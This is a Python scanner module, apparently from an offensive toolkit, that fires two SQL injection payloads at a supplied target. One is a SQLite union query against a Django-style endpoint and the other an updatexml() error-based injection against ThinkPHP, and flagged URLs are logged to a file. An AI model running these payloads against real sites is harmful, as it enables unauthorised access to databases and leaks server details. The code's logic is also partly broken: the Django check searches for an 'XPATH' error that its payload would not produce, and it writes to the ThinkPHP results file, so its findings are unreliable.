#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class DjangoSqlScan:

    def run(self, urls):
        try:
            url = urls + '/demo?field=demo.name" FROM "demo_user" union SELECT "1",sqlite_version(),"3" --'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("DJango", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass

    def run2(self,urls):
        try:
            url = urls + '/?id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1) #'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def main(self, target):
        # OutPrintInfo("DocCms", '开始检测SQL注入...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)
        self.headers = req["header"]
        self.proxy = {"http":proxy,"https":proxy}

        self.run(url)
        self.run2(url)

        # OutPrintInfo("DocCms", 'SQL注入检测结束')